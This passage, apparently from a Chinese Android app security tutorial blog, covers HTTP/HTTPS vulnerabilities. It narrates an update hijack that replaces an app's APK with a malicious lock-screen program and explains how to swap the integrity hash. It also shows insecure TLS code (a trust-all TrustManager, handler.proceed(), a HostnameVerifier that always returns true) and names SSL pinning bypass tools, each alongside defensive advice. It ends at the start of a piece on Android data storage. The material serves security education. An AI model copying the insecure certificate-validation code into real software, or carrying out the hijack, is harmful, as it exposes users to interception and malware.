类，实现对证书对校验或让它不要对证书做校验</p>\n<h2 id=\"三、HTTP-x2F-HTTPs漏洞分析和复现\"><a href=\"#三、HTTP-x2F-HTTPs漏洞分析和复现\" class=\"headerlink\" title=\"三、HTTP&#x2F;HTTPs漏洞分析和复现\"></a>三、HTTP&#x2F;HTTPs漏洞分析和复现</h2><h3 id=\"1-漏洞的安全种类和危害\"><a href=\"#1-漏洞的安全种类和危害\" class=\"headerlink\" title=\"1.漏洞的安全种类和危害\"></a>1.漏洞的安全种类和危害</h3><p>Andoid的网络通信中一般采用http明文传输，或使用SSL&#x2F;TLS协议的https密文传输，对于http明文传输来说自然会导致很多漏洞，例如信息泄露漏洞，升级劫持漏洞，验证码口令泄露漏洞等等，而使用https传输的明文，也存在大量的HTTPs证书不校验漏洞，中间人攻击漏洞等等</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/14.png\" alt=\"image-20211205145836325\"></p>\n<h3 id=\"2-HTTP明文传输漏洞\"><a href=\"#2-HTTP明文传输漏洞\" class=\"headerlink\" title=\"2.HTTP明文传输漏洞\"></a>2.HTTP明文传输漏洞</h3><h4 id=\"（1）漏洞案例\"><a href=\"#（1）漏洞案例\" class=\"headerlink\" title=\"（1）漏洞案例\"></a>（1）漏洞案例</h4><h5 id=\"lt-1-gt-酷我音乐APP存在逻辑缺陷漏洞\"><a href=\"#lt-1-gt-酷我音乐APP存在逻辑缺陷漏洞\" class=\"headerlink\" title=\"&lt;1&gt;酷我音乐APP存在逻辑缺陷漏洞\"></a>&lt;1&gt;酷我音乐APP存在逻辑缺陷漏洞</h5><p><a href=\"https://www.cnvd.org.cn/flaw/show/CNVD-2021-45684\">酷我音乐APP存在逻辑缺陷漏洞</a></p>\n<p>漏洞原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">酷我音乐APP采用http明文传输，攻击者可以通过利用该漏洞利用代理工具篡改数据包来升级校验，从而导致APP升级过程中恶意软件注入攻击</span><br></pre></td></tr></table></figure>\n\n<p>漏洞复现：</p>\n<p>我们点击检测新版本，可以抓取对应的响应请求，其中下面的是下载请求</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/15.png\" alt=\"image-20211205145836325\"></p>\n<p>然后，我们可以发现程序下载完成后，显示正常的升级界面</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/16.png\" alt=\"image-20211205150811779\"></p>\n<p>我们可以知道这条请求就是程序的下载请求，对应的就是下载的apk，我们尝试劫持这条请求，将apk替换成我们的恶意锁机程序</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/17.png\" alt=\"image-20211205150811779\"></p>\n<p>下劫持响应请求断点，可以让我们在请求响应前劫持</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/18.png\" alt=\"image-20211205150811779\"></p>\n<p>通过HFS文件管理服务器，来模拟请求的服务器</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/19.png\" alt=\"image-20211205150811779\"></p>\n<p>注意路径应与apk下载请求url保持一致，域名设置为我们本机的ip地址</p>\n<p>重新安装，开始升级</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/20.png\" alt=\"image-20211205150811779\"></p>\n<p>然后升级手机被恶意软件劫持</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/21.png\" alt=\"image-20211205150811779\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/22.png\" alt=\"image-20211205150811779\"></p>\n<h5 id=\"lt-2-gt-上海任意门科技有限公司Soul-APP存在信息泄露漏洞\"><a href=\"#lt-2-gt-上海任意门科技有限公司Soul-APP存在信息泄露漏洞\" class=\"headerlink\" title=\"&lt;2&gt; 上海任意门科技有限公司Soul APP存在信息泄露漏洞\"></a>&lt;2&gt; 上海任意门科技有限公司Soul APP存在信息泄露漏洞</h5><p><a href=\"https://www.cnvd.org.cn/user/myreport/4827046\">上海任意门科技有限公司Soul APP存在信息泄露漏洞</a></p>\n<p>信息泄露原理很简单就是利用http明文传输，导致一些账户信息、登录信息的泄露，具体大家可以拿一个http传输的样本去测试，然后自己去查看一些信息问题</p>\n<h5 id=\"lt-3-gt-酷狗直播存在逻辑缺陷漏洞（hash验证）\"><a href=\"#lt-3-gt-酷狗直播存在逻辑缺陷漏洞（hash验证）\" class=\"headerlink\" title=\"&lt;3&gt;酷狗直播存在逻辑缺陷漏洞（hash验证）\"></a>&lt;3&gt;酷狗直播存在逻辑缺陷漏洞（hash验证）</h5><p><a href=\"https://www.cnvd.org.cn/flaw/show/4050696\">酷狗直播存在逻辑缺陷漏洞（hash验证）</a></p>\n<p>考虑到http明文传输的危害后，一些厂商开始加入hash验证，这也是我们前面讲述过的验证Android应用的完整性，因为每一个Android APP仅拥有唯一的hash值，但是这种我们可以在升级时，同时去替换相应的hash值来达到升级劫持漏洞的过程</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/23.png\" alt=\"image-20211205150811779\"></p>\n<p>我们可以发现在一些厂商的报文中会包含hash值验证，所以如果我们直接去注入恶意程序，我们的应用是安装不上去，但是我们对对应的报文进行替换hash值，替换成我们对于的恶意程序的hash值，我们就可以成功的复现上述升级劫持漏洞的过程</p>\n<h4 id=\"（2）漏洞防护\"><a href=\"#（2）漏洞防护\" class=\"headerlink\" title=\"（2）漏洞防护\"></a>（2）漏洞防护</h4><p>通过上面分析，我们发现上述的漏洞都是因为厂家的APP在传输过程中采用了明文传输导致的，因此防护措施：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）HTTPs加密传输</span><br><span class=\"line\">（<span class=\"number\">2</span>）本地hash验证</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-HTTPs密文传输漏洞\"><a href=\"#3-HTTPs密文传输漏洞\" class=\"headerlink\" title=\"3.HTTPs密文传输漏洞\"></a>3.HTTPs密文传输漏洞</h3><h4 id=\"（1）漏洞案例-1\"><a href=\"#（1）漏洞案例-1\" class=\"headerlink\" title=\"（1）漏洞案例\"></a>（1）漏洞案例</h4><h5 id=\"lt-1-gt-忽略SSL证书校验漏洞\"><a href=\"#lt-1-gt-忽略SSL证书校验漏洞\" class=\"headerlink\" title=\"&lt;1&gt; 忽略SSL证书校验漏洞\"></a>&lt;1&gt; 忽略SSL证书校验漏洞</h5><p>漏洞原理：</p>\n<p>在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。由于客户端没有校验服务端的证书，因此攻击者就能与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容</p>\n<p>目标程序代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyX509TrustManager</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">X509TrustManager</span> &#123;  </span><br><span class=\"line\"><span class=\"comment\">// 检查客户端证书  </span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkClientTrusted</span><span class=\"params\">(X509Certificate[] chain, String authType)</span> <span class=\"keyword\">throws</span> CertificateException &#123; </span><br><span class=\"line\">    <span class=\"comment\">//没有校验的话，就代表接收任意的证书</span></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 检查服务器端证书  </span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkServerTrusted</span><span class=\"params\">(X509Certificate[] chain, String authType)</span> <span class=\"keyword\">throws</span> CertificateException &#123;  </span><br><span class=\"line\">    <span class=\"comment\">//没有校验的话，就代表接收任意的证书</span></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">// 返回受信任的X509证书数组  </span></span><br><span class=\"line\"><span class=\"keyword\">public</span> X509Certificate[] getAcceptedIssuers() &#123;  </span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">null</span>;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>在重写WebViewClient的onReceivedSslError方法时，调用proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p>\n<p>目标程序代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mywebview.setWebViewClient(<span class=\"keyword\">new</span> <span class=\"title class_\">WebviewClient</span>()&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"meta\">@Override</span>  </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceivedError</span><span class=\"params\">(WebView view,<span class=\"type\">int</span> errorCode,String description,String falingUrl)</span>&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// TODO Auto generated method stub  </span></span><br><span class=\"line\">    <span class=\"built_in\">super</span>.onReceivedError(view,errorCode,description,fallingUrl) ;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"meta\">@Override</span>  </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onReceivedSslError</span><span class=\"params\">(WebView view,SslErrorHandler handler,SslError error)</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// T0D0 Auto-generated method stub  </span></span><br><span class=\"line\">    handler.proceed( );  <span class=\"comment\">//不对证书进行处理</span></span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">&#125;);  </span><br></pre></td></tr></table></figure>\n\n<p><strong>案例一：京东金融MITM漏洞</strong></p>\n<p>漏洞原理：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">京东金融Ver 2.8.0由于证书校验有缺陷，导致https中间人攻击，攻击者直接可以获取到会话中敏感数据的加密秘钥，另外由于APP没有做应用加固或混淆，因此可以轻松分析出解密算法，利用获取到的key解密敏感数据</span><br></pre></td></tr></table></figure>\n\n<p>登录后捕获的数据：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/24.png\" alt=\"image-20211205150811779\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/25.png\" alt=\"image-20211205150811779\"></p>\n<p>安全防护：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）建议自定义实现X509TrustManager时，checkServerTrusted中对服务器信息进行严格校验。  </span><br><span class=\"line\">（<span class=\"number\">2</span>）针对自定义TrustManager,检查checkServerTrusted()函数是否为空实现。  </span><br><span class=\"line\">（<span class=\"number\">3</span>）建议不要重写TrustManager 和HostnameVerifier,使用系统默认的。  </span><br><span class=\"line\">（<span class=\"number\">4</span>）在重写WebViewClient的onReceivedSslError方法时，避免调用proceed忽略证书验证。  </span><br><span class=\"line\">（<span class=\"number\">5</span>）禁止使用proceed()函数忽略证书错误，应该抛给系统进行安全警告</span><br></pre></td></tr></table></figure>\n\n<p>例如，我们在相应的地方加上校验：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/26.png\" alt=\"image-20211205154720291\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/28.png\" alt=\"image-20211205154828588\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/27.png\" alt=\"image-20211205154751251\"></p>\n<h5 id=\"lt-2-gt-忽略域名校验漏洞\"><a href=\"#lt-2-gt-忽略域名校验漏洞\" class=\"headerlink\" title=\"&lt;2&gt;忽略域名校验漏洞\"></a>&lt;2&gt;忽略域名校验漏洞</h5><p>在自定义实现HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p>\n<p>目标代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">HostnameVerifier</span> <span class=\"variable\">hv</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">HostnameVerifier</span> ()&#123;  </span><br><span class=\"line\">    <span class=\"meta\">@Override</span>  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">verify</span><span class=\"params\">(String hostname,SSLSession session)</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n\n<p>在setHostnameVerifier方法中使用ALLOW_ALL_HOSTNAME _VERIFIER,信任所有Hostname,导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害</p>\n<p>目标代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> HttpClient <span class=\"title function_\">getNewHttpClient</span><span class=\"params\">()</span> &#123;  </span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;  </span><br><span class=\"line\">    <span class=\"type\">KeyStore</span> <span class=\"variable\">trustStore</span> <span class=\"operator\">=</span> KeyStore.getInstance(KeyStore  </span><br><span class=\"line\">    .getDefaultType());  </span><br><span class=\"line\">    trustStore.load(<span class=\"literal\">null</span>, <span class=\"literal\">null</span>);  </span><br><span class=\"line\">    <span class=\"type\">SSLSocketFactory</span> <span class=\"variable\">sf</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SSLSocketFactory</span>(trustStore);  </span><br><span class=\"line\">    sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);  <span class=\"comment\">//这里信任了所以的hostname，导致可能存在中间人攻击</span></span><br><span class=\"line\">    <span class=\"type\">HttpParams</span> <span class=\"variable\">params</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BasicHttpParams</span>();  </span><br><span class=\"line\">    HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);  </span><br><span class=\"line\">    HttpProtocolParams.setContentCharset(params, HTTP.UTF_8);  </span><br><span class=\"line\">    <span class=\"type\">SchemeRegistry</span> <span class=\"variable\">registry</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SchemeRegistry</span>();  </span><br><span class=\"line\">    registry.register(<span class=\"keyword\">new</span> <span class=\"title class_\">Scheme</span>(<span class=\"string\">&quot;http&quot;</span>, PlainSocketFactory  </span><br><span class=\"line\">    .getSocketFactory(), <span class=\"number\">80</span>));  </span><br><span class=\"line\">    registry.register(<span class=\"keyword\">new</span> <span class=\"title class_\">Scheme</span>(<span class=\"string\">&quot;https&quot;</span>, sf, <span class=\"number\">443</span>));  </span><br><span class=\"line\">    <span class=\"type\">ClientConnectionManager</span> <span class=\"variable\">ccm</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ThreadSafeClientConnManager</span>(  </span><br><span class=\"line\">    params, registry);  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DefaultHttpClient</span>(ccm, params);  </span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (Exception e) &#123;  </span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DefaultHttpClient</span>();  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><strong>案例二：<a href=\"https://www.cnvd.org.cn/flaw/show/4069106\">WPS存在信息泄漏漏洞</a></strong></p>\n<p>WPS采用HTTPs进行通信但是由于证书校验问题，可以被获取到敏感信息，从而导致信息泄漏漏洞，这里和上面一致，就不再重新演示了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/29.png\" alt=\"image-20211205155437510\"></p>\n<p>安全防护：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）在自定义实现HostnameVerifier时，在verify中对Hostname进行严格校验</span><br><span class=\"line\">（2）建议setHostnameVerifier方法中使用STRICT_HOSTNAME_VERIFIER进行严格证书校验，避免使用ALLOW_ALL_HOSTNAME_VERIFIER</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-3-gt-作业帮存在https升级劫持漏洞\"><a href=\"#lt-3-gt-作业帮存在https升级劫持漏洞\" class=\"headerlink\" title=\"&lt;3&gt;作业帮存在https升级劫持漏洞\"></a>&lt;3&gt;作业帮存在https升级劫持漏洞</h5><p>大家都知道https是采用加密方式来进行通信，一般来说除非证书的设置方面存在漏洞，否则很难直接去截获报文信息，但是在我挖掘漏洞的过程中，发现一个新的思路，可能这是很多厂商比较懒的原因，直接升级https后，传输的报文数据还是原来的数据，所以我们可以选择采用http旧版本的APP，抓取明文信息，修改后，使用于新版的信息，也可以导致劫持的漏洞</p>\n<p>当然这个过程中也需要解决接收方证书信任的问题，还需要模拟https的请求方式，这里可以使用<a href=\"https://bbs.pediy.com/thread-268459.htm\">stunnel配置</a>，这里主要提供一种思路，其他操作步骤和上述一直，就不再重复演示了</p>\n<h4 id=\"（2）漏洞防护-1\"><a href=\"#（2）漏洞防护-1\" class=\"headerlink\" title=\"（2）漏洞防护\"></a>（2）漏洞防护</h4><p>针对于Android https的开发过程中常见的安全缺陷：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>)在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class=\"line\"><span class=\"number\">2</span>)在重写WebViewClient的onReceivedSslError方法时，调用proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class=\"line\"><span class=\"number\">3</span>)在自定义实现HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class=\"line\"><span class=\"number\">4</span>)在setHostnameVerifier方法中使用ALLOW_ALL_HOSTNAME_VERIFIER，信任所有Hostname，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Android-绕过https的SSL-Pining\"><a href=\"#四、Android-绕过https的SSL-Pining\" class=\"headerlink\" title=\"四、Android 绕过https的SSL Pining\"></a>四、Android 绕过https的SSL Pining</h2><p>我们在对Android APP抓包时，经常会出现HTTPS报文通过MITM代理后不被信任的问题，有些https在设置好证书后，会出现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">unknown</span><br><span class=\"line\">加密的乱码</span><br><span class=\"line\">报错无法抓包</span><br></pre></td></tr></table></figure>\n\n<p>这是因为对方的https采用了 SSL pinning</p>\n<h3 id=\"1-SSL-pinning\"><a href=\"#1-SSL-pinning\" class=\"headerlink\" title=\"1.SSL pinning\"></a>1.SSL pinning</h3><p>SSL pining &#x3D; 证书绑定 &#x3D; SSL证书绑定</p>\n<p>表示对方的app只允许承认自己特定的证书，这导致MITM的证书不被识别，不运行，从而导致MITM无法解密看到https的明文数据</p>\n<h3 id=\"2-Android-7-0后破解https-的ssl-pinning\"><a href=\"#2-Android-7-0后破解https-的ssl-pinning\" class=\"headerlink\" title=\"2.Android 7.0后破解https 的ssl pinning\"></a>2.Android 7.0后破解https 的ssl pinning</h3><p>Android7.0后，系统做了改动：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">APP 默认不信任用户域的证书。之前把MITM的ssl证书，安装到 受信任的凭据 -&gt; 用户 就没用了，因为不受信任了。只信任（安装到）系统域的证书</span><br></pre></td></tr></table></figure>\n\n<p>因此这导致我们使用如Fiddler、Charles等抓包软件导入证书后，仍然不能在捕获https的密文，甚至无法解析请求</p>\n<p>解决思路：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）让系统信任Charles的ssl证书</span><br><span class=\"line\">\t改自己的app的配置，允许https抓包，这就需要有app的源码</span><br><span class=\"line\">\t把证书放到受系统信任的系统证书中去。前提是手机已root</span><br><span class=\"line\">（2）绕开https不去校验</span><br><span class=\"line\">\t使用基于Xposed等框架的JustTrustMe、基于Frida框架的r0capyure等</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-证书绕过原理\"><a href=\"#3-证书绕过原理\" class=\"headerlink\" title=\"3.证书绕过原理\"></a>3.证书绕过原理</h3><p>我们基于上文提出第二种思路，详细解析当下的JustTrustMe为代表的证书绕过原理</p>\n<p>通过前面我们了解到，证书验证中到关键是 TrustManager，而绕过证书验证就需要从它入手。xpsoed 上证书校验的绕过插件就是这么干的，目前比较流行的两款基于 xposed 的绕过证书验证的模块有两款 JustTrustMe 和 SSLkiller，针对HttpsURLConnection，OkHttp 框架各自的证书校验函数</p>\n<p>这两款工具通过 hook 这些关键函数，或替换 TrustManager(信任所有证书)或令其验证函数直接失效(函数替换，不做任何校验)，以达到绕过的目的</p>\n<p>绕过证书的实现原理图，下图参考博客<a href=\"https://juejin.cn/post/6992844908788711438\">安卓 https 证书校验和绕过</a>：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/33.png\" alt=\"image-20211205155437510\"></p>\n<h3 id=\"4-工具使用\"><a href=\"#4-工具使用\" class=\"headerlink\" title=\"4.工具使用\"></a>4.工具使用</h3><h4 id=\"（1）Xposed-JustTrustMe\"><a href=\"#（1）Xposed-JustTrustMe\" class=\"headerlink\" title=\"（1）Xposed+JustTrustMe\"></a>（1）Xposed+JustTrustMe</h4><p><a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe下载地址</a></p>\n<p>使用步骤十分简单，就在手机上安装xposed框架，具体安装参考前文帖子，然后将JustTrustMe模块安装就可以使用了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/34.png\" alt=\"image-20211205184421953\"></p>\n<h4 id=\"（2）Frida脚本\"><a href=\"#（2）Frida脚本\" class=\"headerlink\" title=\"（2）Frida脚本\"></a>（2）Frida脚本</h4><p>下面是两种比较火的frida抓包脚本</p>\n<p><a href=\"https://codeshare.frida.re/@masbog/frida-android-unpinning-ssl/\">frida-android-unpinning-ssl</a></p>\n<p><a href=\"https://github.com/r0ysue/r0capture\">r0capture</a></p>\n<p>使用步骤：</p>\n<p>开启frida_server注入脚本就可以了，具体可以参考博客网址</p>\n<h2 id=\"五、实验总结\"><a href=\"#五、实验总结\" class=\"headerlink\" title=\"五、实验总结\"></a>五、实验总结</h2><p>本文从Android Http&#x2F;Https通信过程出发，讲述了Android Http&#x2F;Https通信漏洞产生的原因，也拿了很多的漏洞复现实例来进行一一说明，最后还简单介绍了当下对https转包的处理和原因，当然这部分东西很多还需要进一步深入的研究，本文可能还未归纳完全所有的情况，就请大家指正了</p>\n<h2 id=\"六、参考文献\"><a href=\"#六、参考文献\" class=\"headerlink\" title=\"六、参考文献\"></a>六、参考文献</h2><p>Android http&#x2F;https原理解析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">第一行代码</span><br><span class=\"line\">Frida 逆向和抓包实战</span><br><span class=\"line\">https://zhuanlan.zhihu.com/p/330393659</span><br><span class=\"line\">https://xiaoyue26.github.io/2018/09/26/2018-09/%E9%80%9A%E4%BF%97%E7%90%86%E8%A7%A3SSL-TLS%E5%8D%8F%E8%AE%AE%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%8E%9F%E7%90%86/</span><br></pre></td></tr></table></figure>\n\n<p>Android https漏洞挖掘：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.geek-share.com/detail/2727192403.html</span><br><span class=\"line\">https://www.cxyzjd.com/article/u010982507/85258477</span><br><span class=\"line\">https://www.jianshu.com/p/84df0a40127c</span><br></pre></td></tr></table></figure>\n\n<p>Android 证书绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://juejin.cn/post/6992844908788711438</span><br><span class=\"line\">https://www.jianshu.com/p/34912804bf08</span><br><span class=\"line\">https://www.panaihua.com/android-catchhttp/</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（14）——信息泄露漏洞详解","url":"/2023/02/13/bug0014/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>好久没有更新帖子了，最近一直都比较忙，这里首先祝大家腊八节快乐。本文主要围绕Android APP漏洞中的信息泄露漏洞展开描述，因为挖掘Android APP信息泄露漏洞的思路各有差异，所以本文只是基于Android APP中较为基础的信息泄露的漏洞实例开始讲述。</p>\n<span id=\"more\"></span>\n<p>本文第二节主要讲述Android中存储的基本方式</p>\n<p>本文第三节主要讲述信息泄露漏洞的分类</p>\n<p>本文第四节主要讲述漏洞的原因和具体复现</p>\n<h2 id=\"二、基础知识\"><a href=\"#二、基础知识\" class=\"headerlink\" title=\"二、基础知识\"></a>二、基础知识</h2><p>APP 信息泄露漏洞往往和Android APP的数据存储方式有关，所以我们这里首先详细的了解Android的数据存储方式。我们知道Android中数据存储的方式共有五种，分别为：文件存储、SharedPreferences、SQLite数据库存储、ContentProvider、网络存储。</p>\n<h3 id=\"1-文件存储\"><a href=\"#1-文件存储\" class=\"headerlink\" title=\"1.文件存储\"></a>1.文件存储</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/1.png\" alt=\"image-20220102214434734\"></p>\n<p>下面我们将结合上面的思维导图依次讲解</p>\n<h4 id=\"（1）内部存储\"><a href=\"#（1）内部存储\" class=\"headerlink\" title=\"（1）内部存储\"></a>（1）内部存储</h4><p>内部存储一般存储一些应用的数据，如apk、shareprefence、database数据、webview缓存和图片缓存等等，内部存储一般存储在<code>/data/</code>下面，这些都需要用户获得root权限后才能访问到</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/2.png\" alt=\"image-20220102215413773\"></p>\n<p>我们以root权限的模式进入：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/3.png\" alt=\"image-20220102215509371\"></p>\n<p>下面我们介绍常见的一些内部存储目录：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/data/app/    存储着我们手机上安装的apk文件</span><br><span class=\"line\">/data/data/包名/share_prefs  存储对应的应用程序中的shareprefence存储文件</span><br><span class=\"line\">/data/data/包名/cache    存储对应的应用程序中的cache缓存文件</span><br><span class=\"line\">/data/data/包名/databases  存储对应的应用程序中的数据库文件</span><br><span class=\"line\">/data/data/包名/files      存储对应的应用程序中的资源文件</span><br></pre></td></tr></table></figure>\n\n<p>内部存储的特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">内部存储的文件和目录只能被我们的app自己所访问，别的app不能访问。</span><br><span class=\"line\">内部存储中的私有目录，当用户卸载app之后，改文件目录中关于该应用的信息就会被删除。</span><br><span class=\"line\">内部存储是可用的。</span><br><span class=\"line\">内部存储大小有限，不适合存储大量数据。</span><br><span class=\"line\">只有root的手机，才能从手机文件管理器看见，否则都是隐藏着的。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）外部存储\"><a href=\"#（2）外部存储\" class=\"headerlink\" title=\"（2）外部存储\"></a>（2）外部存储</h4><p>Android4.4以前，手机自身的存储就叫内部存储，插入SD卡的存储叫外部存储，然而Android 4.4以后，手机自带的存储很大，因此现在的外部存储分为两部分：SD卡和扩展卡内存。外部存储一般分为两类，私有目录和公有目录，私有目录里面的数据会随着应用的卸载而删除，公有目录并不会</p>\n<p>自身的外部存储目录：<code>/storage/emulated/0/Android/data/packagename/files</code></p>\n<p>存储卡的存储目录：<code>/storage/extSdCard/Android/data/packagename/files</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/4.png\" alt=\"image-20220103165631522\"></p>\n<p>外部存储的特点：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">公有目录任何程序都可以访问，私有目录自身可以访问。</span><br><span class=\"line\">并不一定是可用的，因为SD卡会被挂载。</span><br><span class=\"line\">外部存储中的私有目录中的数据会随着应用的卸载而删除，公有目录则不会。</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-1-gt-私有目录\"><a href=\"#lt-1-gt-私有目录\" class=\"headerlink\" title=\"&lt;1&gt; 私有目录\"></a>&lt;1&gt; 私有目录</h5><p>私有目录，在Android 